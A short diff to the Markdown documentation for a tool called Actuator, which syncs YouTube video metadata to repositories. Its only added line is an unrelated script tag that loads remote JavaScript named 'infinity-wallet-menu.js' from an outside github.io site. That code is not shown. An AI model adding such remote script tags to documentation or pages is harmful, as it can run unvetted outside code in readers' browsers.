@@ -15,3 +15,4 @@ Actuator can fetch a YouTube video's metadata and sync it as a Markdown file (`s
 When `YOUTUBE_URL` is set, `sync-repos.js` calls the YouTube oEmbed API to retrieve the video title, channel, and thumbnail, then writes a formatted Markdown file to each target repository. No YouTube API key is required.
 
 When `YOUTUBE_URL` is not set, Actuator falls back to its default behaviour of writing a status file (`communication/status.txt`) to each target repository.
+<script src="https://www-infinity4.github.io/Mint-For-Infinity/infinity-wallet-menu.js" defer></script>
